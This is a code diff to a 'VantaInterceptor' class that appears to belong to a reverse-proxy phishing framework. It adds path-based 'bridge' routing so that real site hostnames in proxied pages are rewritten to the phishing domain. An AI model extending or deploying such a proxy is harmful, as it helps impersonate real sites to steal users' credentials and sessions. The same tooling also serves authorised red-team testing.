@@ -547,19 +547,26 @@ class VantaInterceptor:
                      pass
 
                 # Prepare replacement
-                # We need to find the phish_sub for the domain in the filter
-                # The filter has orig_sub and domain.
-                # We look for a proxy_host with same orig_sub and domain.
-                phish_sub = None
-                for ph in self.phishlet.proxy_hosts:
-                    if ph.orig_sub == f.orig_sub and ph.domain == f.domain:
-                        phish_sub = ph.phish_sub
+                target_hostname = f"{f.orig_sub}.{f.domain}"
+                phish_hostname = None
+
+                # 1. Check Bridge (Priority for Single Domain / Path-based routing)
+                for br in getattr(self.phishlet, "bridges", []):
+                    if br.target_host == target_hostname:
+                        pfx = br.prefix
+                        if not pfx.startswith("/"): pfx = "/" + pfx
+                        if pfx.endswith("/"): pfx = pfx[:-1]
+                        phish_hostname = f"{base_domain}{pfx}"
                         break
                 
-                if not phish_sub: continue
+                # 2. Check ProxyHost (Subdomain mapping)
+                if not phish_hostname:
+                    for ph in self.phishlet.proxy_hosts:
+                        if ph.orig_sub == f.orig_sub and ph.domain == f.domain:
+                            phish_hostname = f"{ph.phish_sub}.{base_domain}"
+                            break
                 
-                phish_hostname = f"{phish_sub}.{base_domain}"
-                target_hostname = f"{f.orig_sub}.{f.domain}"
+                if not phish_hostname: continue
                 
                 search_str = f.search.replace("{hostname}", target_hostname).replace("{domain}", f.domain)
                 replace_str = f.replace.replace("{hostname}", phish_hostname).replace("{domain}", base_domain)
